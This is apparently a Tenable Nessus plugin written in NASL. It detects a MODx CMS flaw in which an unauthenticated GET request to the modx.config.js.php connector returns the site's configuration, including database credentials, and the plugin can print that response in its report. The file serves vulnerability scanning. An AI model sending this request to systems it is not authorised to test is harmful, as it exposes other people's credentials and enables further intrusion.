#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40419);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(35824);

  script_name(english:"MODx config.js.php Information Disclosure");
  script_summary(english:"Retrieves $modx->config as JSON");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by\n",
      "an information disclosure vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote web server is running MODx, an open source content\n",
      "management system. \n",
      "\n",
      "The version of MODx installed on the remote host fails to limit access\n",
      "to the 'core/model/modx/processors/system/config.js.php' script before\n",
      "returning the application's configuration settings, including database\n",
      "credentials.  An unauthenticated remote attacker may be able to use\n",
      "this information for further attacks."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://svn.modxcms.com/crucible/changelog/modx/?cs=5501"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://modxcms.com/forums/index.php/topic,37961.msg229068.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Upgrade to revision 5505 from the subversion repository or apply the\n",
      "patch referenced above in the project advisory."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/07/23"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/07/28"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/modx", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  #
  # nb: we can't access the affected script directly.
  url = string(
    dir, "/connectors/layout/modx.config.js.php?",
    "action=", SCRIPT_NAME
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server did not respond.");

  # There's a problem if we see config info.
  if (
    'MODx.config = {' >< res[2] &&
    '"loader_classes":["modAccessibleObject"],' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report += string(
          "\n",
          "Here is the response showing the installation's configuration\n",
          "settings :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          res[2], "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
exit(0, "The host is not affected.");
